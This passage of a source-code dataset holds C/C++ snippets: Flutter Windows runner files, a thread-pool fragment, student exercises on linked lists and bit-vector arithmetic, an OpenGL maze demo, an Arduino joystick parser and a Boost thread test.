//cached\u6a21\u5f0f\u4e0b\uff0c\u6709\u53ef\u80fd\u5df2\u7ecf\u521b\u5efa\u4e86\u5f88\u591a\u7ebf\u7a0b\uff0c\u4f46\u662f\u7a7a\u95f2\u65f6\u95f4\u8d85\u8fc760s\uff0c\u5e94\u8be5\u628a\u591a\u4f59\u7684\u7ebf\u7a0b\n            //\u7ed3\u675f\u56de\u6536\u6389\uff08\u8d85\u8fc7initThreadSize_\u6570\u91cf\u7684\u7ebf\u7a0b\u8981\u8fdb\u884c\u56de\u6536\uff09\n            while (Taskque.size() == 0) {\n                if (mode_ == PoolMode::MODE_CACHED) {\n                    if (std::cv_status::timeout ==\n                        notEmpty.wait_for(lock, std::chrono::seconds(1)))//\u6761\u4ef6\u53d8\u91cf\u8d85\u65f6\u8bbf\u95ee\n                    {\n                        auto now = std::chrono::high_resolution_clock().now();\n                        auto dur = std::chrono::duration_cast<std::chrono::seconds>(now - lastTime);\n                        if (dur.count() >= THREAD_MAX_IDLE_TIME\n                            && curThreadSize_ > initThreadSize_) {\n                            //\u5f00\u59cb\u56de\u6536\u7ebf\u7a0b\n                            _threads.erase(threadid); //std::this_thread::getid();\n                            curThreadSize_--;\n                            idleThreadSize_--;\n                            std::cout << \"threadid:\" << std::this_thread::get_id() << \"exit()\";\n                            return;\n                        }\n        ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <stdio.h>\n#include <stdlib.h>\nstruct ElementType {\n\tunsigned long ID;\n\tchar *name;\n};\n\nstruct Node {\n\tstruct ElementType value;\n\tstruct Node *next;\n\tstruct Node *prev;\n};\n\ntypedef struct Node *List;\ntypedef struct Node *Position;\n\nPosition insert(struct ElementType e, Position p){\t\n\tPosition newItem;\n\tnewItem = (Node*)malloc(sizeof(struct Node));\n\tnewItem->value = e;\n\t\n\tnewItem->next = p->next;\n\tnewItem->prev = p;\n\tp->next = newItem;\n\tif (newItem->next!=NULL)\n\t\tnewItem->next->prev = newItem;\n\t\n\treturn newItem;\n}\n\nvoid display(List pL)\n{\n\tint count = 1;\n\tpL = pL->next;\n\twhile (pL!=NULL)\n\t{\n\t\tprintf(\"*** %d | %ld       | %s\\n\",count,pL->value.ID, pL->value.name);\n\t\tpL = pL->next;\n\t\tcount++;\n\t}\n}\n\nPosition find(List pL, unsigned long ID) {\n\tpL=pL->next;\n\twhile (pL!=NULL && pL->value.ID!=ID)\n\t\tpL = pL->next;\n\treturn pL;\n}\n\nvoid Delete(Position p) {\n\tp->prev->next = p->next;\n\tif (p->next!=NULL)\n\t\tp->next->prev = p->prev;\n\tfree(p);\n}\n\nList createList() {\n\tList headerNode = (Node*)malloc(sizeof(struct Node));\n\theaderNode->next = NULL;\n\treturn headerNode;\n}\n\nint main()\n{\n\tList pL = createList();\n\tstruct ElementType e1,e2,e3;\n\t\n\te1.ID = 123; e1.name = \"Nguyen Van A\";\n\te2.ID = 124; e2.name = \"Dang Thi B\";\n\te3.ID = 125; e3.name = \"Do Van C\";\n\t\n\tPosition p = NULL;\n\t\n\tp = insert(e1,pL);\n\tp = insert(e2,p);\n\tp = insert(e3,p);\n\t\n\tdisplay(pL);\n\t\t\n\tp = find(pL,124);\n\t\n\tif (p!=NULL) \n\t\tprintf(\"Found!!!  ID: %ld         Name:%s\\n\",p->value.ID,p->value.name);\n\telse\n\t\tprintf(\"Not Found!!!\");\n\tDelete(p);\n\tprintf(\"After deleted!!!\\n\");\n\tdisplay(pL);\n\treturn 0;\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#define BIT_VECTOR_LENGTH 4\n#define MSB_INDEX BIT_VECTOR_LENGTH - 1\n#define LSB_INDEX 0\n\nvoid print_command(char *argv[]);\nint check_validity(char *input);\nvoid init_bit_vector(char *input, char *bv);\nvoid print_bit_vector(char *bv);\n\nunsigned int b2u(char *bv);\nint b2s(char *bv);\nint b2o(char *bv);\nint b2t(char *bv);\n\nvoid bit_addition(char *bv1, char *bv2, char *result);\nunsigned int unsigned_addition(char *bv1, char *bv2);\nint twos_complement_addition(char *bv1, char *bv2);\nint ones_complement_addition(char *bv1, char *bv2);\nint sign_magnitude_addition(char *bv1, char *bv2);\n\n\nint main(int argc, char *argv[])\n{\n  char bv1[BIT_VECTOR_LENGTH];\n  char bv2[BIT_VECTOR_LENGTH];\n\n  if (argc != 3)\n  {\n    printf(\"Error: invalid number of arguments\\n\");\n    print_command(argv);\n  }\n\n  if (!(check_validity(argv[1]) && check_validity(argv[2])))\n  {\n    printf(\"Error: invalid arguments\\n\");\n    print_command(argv);\n  }\n\n  init_bit_vector(argv[1], bv1);\n  init_bit_vector(argv[2], bv2);\n  print_bit_vector(bv1);\n  printf(\" - b2u: %u\\n\", b2u(bv1));\n  printf(\" - b2s: %d\\n\", b2s(bv1));\n  printf(\" - b2o: %d\\n\", b2o(bv1));\n  printf(\" - b2t: %d\\n\", b2t(bv1));\n\n  print_bit_vector(bv2);\n  printf(\" - b2u: %u\\n\", b2u(bv2));\n  printf(\" - b2s: %d\\n\", b2s(bv2));\n  printf(\" - b2o: %d\\n\", b2o(bv2));\n  printf(\" - b2t: %d\\n\", b2t(bv2));\n\n  printf(\"Addition >>\\n\");\n  printf(\" - Unsigned addition: %u\\n\", unsigned_addition(bv1, bv2));\n  printf(\" - Sign magnitude addition: %d\\n\", sign_magnitude_addition(bv1, bv2));\n  printf(\" - One's complement addition: %d\\n\", ones_complement_addition(bv1, bv2));\n  printf(\" - Two's complement addition: %d\\n\", twos_complement_addition(bv1, bv2));\n\n  return 0;\n}\n\nvoid print_command(char *argv[])\n{\n  printf(\"Command: %s <first bit vector> <second bit vector>\\n\", argv[0]);\n  printf(\"Example: %s 0110 1000\\n\", argv[0]);\n  exit(1);\n}\n\nint check_validity(char *input)\n{\n  int i, len;\n  len = strlen(input);\n\n  if (len < BIT_VECTOR_LENGTH)\n  {\n    return 0;\n  }\n\n  for (i=0; i<len; i++)\n  {\n    if (!(input[i] == '0' || input[i] == '1'))\n      return 0;\n  }\n\n  return 1;\n}\n\nvoid init_bit_vector(char *input, char *bv)\n{\n  int i, len;\n  len = strlen(input);\n\n  for (i=0; i<len; i++)\n  {\n    if (input[i] == '0')\n      bv[BIT_VECTOR_LENGTH-i-1] = 0;\n    else\n      bv[BIT_VECTOR_LENGTH-i-1] = 1;\n  }\n}\n\nvoid print_bit_vector(char *bv)\n{\n  int i;\n  printf(\"Bit Vector >>\\n\");\n  for (i=MSB_INDEX; i>=LSB_INDEX; i--)\n  {\n    printf(\"%d\", bv[i]);\n  }\n  printf(\"\\n\");\n}\n\nunsigned int b2u(char *bv)\n{\n  unsigned int ret;\n  int i, power;\n\n  ret = 0;\n  power = 1;\n  for (i = LSB_INDEX; i<= MSB_INDEX; i++)\n    ret += bv[i] * (power << i);\n  return ret;\n}\n\nint b2s(char *bv)\n{\n  int i, ret, power;\n  ret = 0;\n  power = 1;\n\n  for (i = LSB_INDEX; i<MSB_INDEX; i++)\n    ret += bv[i] * (power << i);\n\n  if (bv[MSB_INDEX])\n    ret *= -1;\n\n  return ret;\n}\n\nint b2o(char *bv)\n{\n  int i, ret, power;\n  ret = 0;\n  power = 1;\n\n  ret = -1 * bv[MSB_INDEX] * ((power << MSB_INDEX) - 1);\n  for (i=LSB_INDEX; i<MSB_INDEX; i++)\n    ret += bv[i] * (power << i);\n\n  return ret;\n}\n\nint b2t(char *bv)\n{\n  int i, ret, power;\n  ret = 0;\n  power = 1;\n\n  ret = -1 * bv[MSB_INDEX] * (power << MSB_INDEX);\n  for (i=LSB_INDEX; i<MSB_INDEX; i++)\n    ret += bv[i] * (power << i);\n\n  return ret;\n}\n\nvoid bit_addition(char *bv1, char *bv2, char *result)\n{\n  int i, tmp;\n  char carry[BIT_VECTOR_LENGTH+1];\n\n  for (i=LSB_INDEX; i<=MSB_INDEX; i++)\n  {\n    tmp = bv1[i] + bv2[i] + carry[i];\n\n    switch (tmp)\n    {\n      case 0:\n        result[i] = 0;\n        carry[i+1] = 0;\n        break;\n\n      case 1:\n        result[i] = 1;\n        carry[i+1] = 0;\n        break;\n\n      case 2:\n        result[i] = 0;\n        carry[i+1] = 1;\n        break;\n\n      case 3:\n        result[i] = 1;\n        carry[i+1] = 1;\n        break;\n    }\n  }\n}\n\n\nunsigned int unsigned_addition(char *bv1, char *bv2)\n{\n  char result[BIT_VECTOR_LENGTH];\n  bit_addition(bv1, bv2, result);\n  return b2u(result);\n}\n\nint sign_magnitude_addition(char *bv1, char *bv2)\n{\n  char result[BIT_VECTOR_LENGTH];\n  bit_addition(bv1, bv2, result);\n  return b2s(result);\n}\n\nint ones_complement_addition(char *bv1, char *bv2)\n{\n  char result[BIT_VECTOR_LENGTH];\n  bit_addition(bv1, bv2, result);\n  return b2o(result);\n}\n\nint twos_complement_addition(char *bv1, char *bv2)\n{\n  char result[BIT_VECTOR_LENGTH];\n  bit_addition(bv1, bv2, result);\n  return b2t(result);\n}\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_retrofit_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <GL/freeglut.h>\n#include <cmath>\n#include <vector>\n#include <iostream>\n\n// Global variables for camera position and angle\nfloat cameraAngleX = 0.0f;\nfloat cameraAngleY = 0.0f;\nfloat cameraPosX = 0.0f;\nfloat cameraPosY = 0.0f; // This will remain constant for level movement\nfloat cameraPosZ = 5.0f;\n\n// Initialize mouse position\nint mouseX = 0, mouseY = 0;\n\nstruct Wall {\n    float minX, maxX, minZ, maxZ; // Bounding box of the wall\n};\n\nstd::vector<Wall> walls;\n\n// Initialize your maze structure, including walls\nvoid initMaze() {\n    // Example: Add a cube wall centered at (0, 0) with a side length of 1\n    Wall wall = { -0.5f, 0.5f, -0.5f, 0.5f }; // This assumes Y is up, and we're looking down on XZ plane\n    walls.push_back(wall);\n    // Add other walls as needed\n}\n\nbool checkCollisionWithWalls(float nextX, float nextZ) {\n    for (const Wall& wall : walls) {\n        if (nextX >= wall.minX && nextX <= wall.maxX &&\n            nextZ >= wall.minZ && nextZ <= wall.maxZ) {\n            return true; // Collision detected\n        }\n    }\n    return false; // No collision\n}\n\nvoid display() {\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n    glLoadIdentity();\n\n    // Calculate camera direction based on mouse movement\n    float lx = sin(cameraAngleX);\n    float lz = -cos(cameraAngleX);\n    float ly = sin(cameraAngleY);\n\n    // The camera's Y position is constant; it doesn't change with mouse movement\n    gluLookAt(cameraPosX, cameraPosY, cameraPosZ,\n        cameraPosX + lx, cameraPosY + ly, cameraPosZ + lz,\n        0.0f, 1.0f, 0.0f);\n\n    for (const Wall& wall : walls) {\n        glPushMatrix();\n        float centerX = (wall.minX + wall.maxX) / 2.0f;\n        float centerZ = (wall.minZ + wall.maxZ) / 2.0f;\n        float sizeX = wall.maxX - wall.minX;\n        float sizeZ = wall.maxZ - wall.minZ;\n\n        glTranslatef(centerX, 0.0f, centerZ); // Translate to the center of the cube\n        glScalef(sizeX, 1.0f, sizeZ); // Scale cube to correct size (assuming uniform height for simplicity)\n        glutWireCube(1.0f); // Draw cube with unit size, scaling will adjust\n        glPopMatrix();\n    }\n\n\n    glutSwapBuffers();\n}\n\nvoid reshape(int w, int h) {\n    if (h == 0) h = 1;\n    float ratio = 1.0 * w / h;\n\n    glMatrixMode(GL_PROJECTION);\n    glLoadIdentity();\n\n    glViewport(0, 0, w, h);\n    gluPerspective(45.0, ratio, 0.1, 100.0);\n\n    glMatrixMode(GL_MODELVIEW);\n}\n\nvoid processNormalKeys(unsigned char key, int x, int y) {\n    float fraction = 0.1f;\n\n    float deltaX = 0, deltaZ = 0;\n\n    // Calculate camera direction components based on the current camera angle\n    float lx = sin(cameraAngleX);\n    float lz = -cos(cameraAngleX);\n\n    switch (key) {\n    case 'w':\n        deltaZ = fraction * lz;\n        deltaX = fraction * lx;\n        break;\n    case 's':\n        deltaZ = -fraction * lz;\n        deltaX = -fraction * lx;\n        break;\n    case 'a':\n        // Move left\n        deltaX = -fraction * cos(cameraAngleX);\n        deltaZ = -fraction * sin(cameraAngleX);\n        break;\n    case 'd':\n        // Move right\n        deltaX = fraction * cos(cameraAngleX);\n        deltaZ = fraction * sin(cameraAngleX);\n        break;\n    }\n\n    float nextX = cameraPosX + deltaX;\n    float nextZ = cameraPosZ + deltaZ;\n\n    if (!checkCollisionWithWalls(nextX, nextZ)) {\n        // If no collision, proceed with movement\n        cameraPosX = nextX;\n        cameraPosZ = nextZ;\n    }\n    else {\n        std::cout << \"Collision\" << \"\\n\";\n    }\n}\n\nvoid mouseMove(int x, int y) {\n    // Initialize mouse position to the center of the window\n    int windowWidth = glutGet(GLUT_WINDOW_WIDTH);\n    int windowHeight = glutGet(GLUT_WINDOW_HEIGHT);\n\n    // Calculate the mouse movement from the center of the window\n    int deltaX = x - windowWidth / 2;\n    int deltaY = y - windowHeight / 2;\n\n    // Only update camera angles if there was any movement\n    if (deltaX != 0 || deltaY != 0) {\n        cameraAngleX += deltaX * 0.001f;\n        cameraAngleY -= deltaY * 0.001f;\n\n        // Limit the vertical look angle to prevent flipping\n        if (cameraAngleY < -1.5f)\n            cameraAngleY = -1.5f;\n        else if (cameraAngleY > 1.5f)\n            cameraAngleY = 1.5f;\n    }\n\n    // Always re-center the mouse pointer to prevent it from leaving the window\n    glutWarpPointer(windowWidth / 2, windowHeight / 2);\n}\n\n\nint main(int argc, char** argv) {\n    // Initialize GLUT and create a window\n    glutInit(&argc, argv);\n    glutInitDisplayMode(GLUT_DEPTH | GLUT_DOUBLE | GLUT_RGBA);\n    glutInitWindowPosition(100, 100);\n    glutInitWindowSize(1600, 1200);\n    glutCreateWindow(\"3D Navigation Example\");\n    glutSetCursor(GLUT_CURSOR_NONE);\n\n    initMaze();\n\n    // Register callbacks\n    glutDisplayFunc(display);\n    glutReshapeFunc(reshape);\n    glutIdleFunc(display);\n    glutKeyboardFunc(processNormalKeys);\n    glutPassiveMotionFunc(mouseMove); // Mouse movement without buttons pressed\n\n    // OpenGL initialization\n    glEnable(GL_DEPTH_TEST);\n\n    // Se",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"le3dp_rptparser2.0.h\"\n\nJoystickReportParser::JoystickReportParser(JoystickEvents *evt) :\n\tjoyEvents(evt)\n{}\n\nvoid JoystickReportParser::Parse(USBHID *hid, bool is_rpt_id, uint8_t len, uint8_t *buf)\n{\n\tbool match = true;\n\n\t// Checking if there are changes in report since the method was last called\n\tfor (uint8_t i=0; i<RPT_GAMEPAD_LEN; i++) {\n\t\tif( buf[i] != oldPad[i] ) {\n\t\t\tmatch = false;\n\t\t\tbreak;\n\t\t}\n  }\n  \t// Calling Game Pad event handler\n\tif (!match && joyEvents) {\n\t\tjoyEvents->OnGamePadChanged((const GamePadEventData*)buf);\n\n\t\tfor (uint8_t i=0; i<RPT_GAMEPAD_LEN; i++) oldPad[i] = buf[i];\n\t}\n}\n\n\n//Joystick events below\n//***********************************************************************************************************************\nvoid JoystickEvents::OnGamePadChanged(const GamePadEventData *evt)\n{ \n  m_X_Val = evt->x;\n  m_Y_Val = map(evt->y, 1023, 0, 0, 1023);\n  m_Hat_Val = evt->hat;\n  m_Twist_Val = evt->twist;\n  m_Slider_Val = map(evt->slider, 255, 0, 0, 250);\n  m_Joy_Button = 0;\n  m_Joy_Button = 1 + log(evt->buttons_a)/log(2);\n  if (evt->buttons_b) m_Joy_Button = 9 + log(evt->buttons_b)/log(2);\n}\n\nvoid JoystickEvents::PrintValues()\n{\n  Serial.print(\"X = \");\n  Serial.print(m_X_Val);\n  Serial.print(\"\\t Y =   \");\n  Serial.print(m_Y_Val);\n  Serial.print(\"\\t Hat = \");\n  Serial.print(m_Hat_Val);\n  Serial.print(\"\\t Twist = \");\n  Serial.print(m_Twist_Val);\n  Serial.print(\"\\t Slider = \");\n  Serial.print(m_Slider_Val);\n  Serial.print(\"\\t Button = \");\n  Serial.println(m_Joy_Button);\n}\n\nvoid JoystickEvents::GetValues (int &Xval, int &Yval, int &Hval, int &Tval, int &Sval, int &JBval)\n{\n  Xval = m_X_Val;\n  Yval = m_Y_Val;\n  Hval = m_Hat_Val;\n  Tval = m_Twist_Val;\n  Sval = m_Slider_Val;\n  JBval = m_Joy_Button;\n}\n\n",
    "//===----------------------------------------------------------------------===//\n//\n//                     The LLVM Compiler Infrastructure\n//\n// This file is dual licensed under the MIT and the University of Illinois Open\n// Source Licenses. See LICENSE.TXT for details.\n//\n//===----------------------------------------------------------------------===//\n\n// Copyright (C) 2011 Vicente J. Botet Escriba\n//\n//  Distributed under the Boost Software License, Version 1.0. (See accompanying\n//  file LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)\n\n// <boost/thread/locks.hpp>\n\n// template <class Mutex> class shared_lock;\n\n// explicit shared_lock(Mutex& m);\n\n#include <boost/thread/lock_types.hpp>\n#include <boost/thread/shared_mutex.hpp>\n#include <boost/thread/thread.hpp>\n#include <boost/detail/lightweight_test.hpp>\n#include \"../../../../../timming.hpp\"\n\nboost::shared_mutex m;\n\n#if defined BOOST_THREAD_USES_CHRONO\ntypedef boost::chrono::high_resolution_clock Clock;\ntypedef Clock::time_point time_point;\ntypedef Clock::duration duration;\ntypedef boost::chrono::milliseconds ms;\ntypedef boost::chrono::nanoseconds ns;\ntime_point t0;\ntime_point t1;\n#else\n#endif\n\nconst ms max_diff(BOOST_THREAD_TEST_TIME_MS);\n\nvoid f()\n{\n#if defined BOOST_THREAD_USES_CHRONO\n  t0 = Clock::now();\n  {\n    boost::shared_lock<boost::shared_mutex> ul(m);\n    t1 = Clock::now();\n  }\n#else\n  //time_point t0 = Clock::now();\n  //time_point t1;\n  {\n    boost::shared_lock<boost::shared_mutex> ul(m);\n    //t1 = Clock::now();\n  }\n  //ns d = t1 - t0 - ms(250);\n  //BOOST_TEST(d < max_diff);\n#endif\n}\n\nint main()\n{\n  m.lock();\n  boost::thread t(f);\n#if defined BOOST_THREAD_USES_CHRONO\n  time_point t2 = Clock::now();\n  boost::this_thread::sleep_for(ms(250));\n  time_point t3 = Clock::now();\n#else\n#endif\n  m.unlock();\n  t.join();\n\n#if defined BOOST_THREAD_USES_CHRONO\n  ns sleep_time = t3 - t2;\n  ns d_ns = t1 - t0 - sleep_time;\n  ms d_ms = boost::chrono::duration_cast<boost::chrono::milliseconds>(d_ns);\n  // BOOST_TEST_GE(d_ms.count(), 0);\n  BOOST_THREAD_TEST_IT(d_ms, max_diff);\n  BOOST_THREAD_TEST_IT(d_ns, ns(max_diff));\n#endif\n\n  return boost::report_errors();\n}\n\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if 